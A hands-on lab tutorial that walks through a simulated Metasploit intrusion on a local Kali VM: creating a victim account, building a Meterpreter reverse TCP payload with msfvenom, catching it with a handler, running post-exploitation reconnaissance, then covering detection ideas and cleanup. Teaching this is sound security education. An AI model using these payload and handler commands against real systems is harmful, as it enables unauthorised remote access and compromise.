# Exploitation Basics with Metasploit (Local Simulation Lab)

**Estimated time:** ~30 minutes  
**Environment:** Kali Linux (local VM only)

This lab walks through a complete exploitation *simulation* using Metasploit.  
No real targets are involved. All activity occurs on the local machine against a deliberately created low‑privilege user.

The goal is to understand how exploits, payloads, handlers, and sessions fit together—both from an attacker’s and a defender’s perspective.

---

## Learning Objectives

By completing this lab, you will be able to:

- Explain the end‑to‑end flow of an exploit in Metasploit
- Generate and deliver a reverse shell payload
- Catch a callback using a Metasploit handler
- Interact with a Meterpreter session
- Perform basic post‑exploitation reconnaissance
- Reason about detection from a blue‑team viewpoint
- Clean up a test environment responsibly

---

## Prerequisites

- Kali Linux VM
- Metasploit Framework installed (default on Kali)
- Root or sudo access
- **Authorization:** This lab must only be run on systems you own or are permitted to test

---

## Exercise 1: Simulate a Vulnerable Environment

Create a low‑privileged user to represent a typical victim account.

```bash
sudo adduser victim --disabled-password --gecos ""
````

**Why this matters**

Most compromises begin with user‑level access, not root. This models a realistic initial foothold.

---

## Exercise 2: Generate a Reverse Shell Payload

Create a Linux Meterpreter reverse TCP payload using `msfvenom`.

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=127.0.0.1 LPORT=4444 \
  -f elf -o shell64.elf

chmod +x shell64.elf
```

**Why this matters**

Payloads define *what happens* after exploitation. Here, the payload establishes a reverse connection back to the attacker.

---

## Exercise 3: Deliver the Payload

Place the payload in the victim’s home directory.

```bash
sudo cp shell64.elf /home/victim/
sudo chown victim:victim /home/victim/shell64.elf
```

**Why this matters**

This simulates common delivery mechanisms such as phishing, USB drops, or post‑exploit file writes.

---

## Exercise 4: Set Up a Metasploit Handler

Start Metasploit and configure a handler to receive the reverse connection.

```bash
msfconsole
```

Inside Metasploit:

```text
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 127.0.0.1
set LPORT 4444
run
```

**Why this matters**

The handler acts as the command‑and‑control listener. Without it, the payload has nowhere to call back.

---

## Exercise 5: Simulate Payload Execution

In a second terminal, execute the payload as the victim user.

```bash
sudo -u victim /home/victim/shell64.elf
```

**Why this matters**

This step represents the moment the attacker gains interactive access.

---

## Exercise 6: Interact with the Meterpreter Session

Back in Metasploit:

```text
background
sessions
sessions -i 1
```

**Why this matters**

Sessions represent active compromises. Meterpreter provides a powerful, in‑memory interface for post‑exploitation.

---

## Exercise 7: Post‑Exploitation Reconnaissance

Inside Meterpreter:

```text
getuid
sysinfo
shell
```

From the spawned shell:

```bash
whoami
id
uname -a
```

**Why this matters**

Reconnaissance confirms:

* Current user context
* Privilege level
* OS and architecture

These details guide privilege escalation and lateral movement decisions.

---

## Challenge Exercise: Think Like a Blue Team

Without using Metasploit, try to detect the compromise using basic Linux tools.

Ideas to explore:

* Running processes (`ps`, `top`)
* Network connections (`ss`, `netstat`)
* User activity (`last`, `who`)
* File system changes in `/home/victim`
* Shell history and execution artifacts

**Why this matters**

Attackers leave traces. Learning how defenders detect them sharpens both offensive and defensive intuition.

---

## Exercise 8: Cleanup

Exit all shells and sessions:

```text
exit
exit
exit
```

Remove the payload and victim account:

```bash
sudo rm /home/victim/shell64.elf
sudo deluser --remove-home victim
```

**Why this matters**

Responsible testing includes full cleanup. This mirrors incident‑response validation after containment.

---

## Summary

In this lab you:

* Created a simulated victim environment
* Generated and delivered a Meterpreter payload
* Captured a reverse shell with a handler
* Conducted basic post‑exploitation reconnaissance
* Considered detection from a defensive perspective
* Restored the system to a clean state

This is the minimal, controlled anatomy of a real‑world intrusion—compressed into a safe learning exercise.
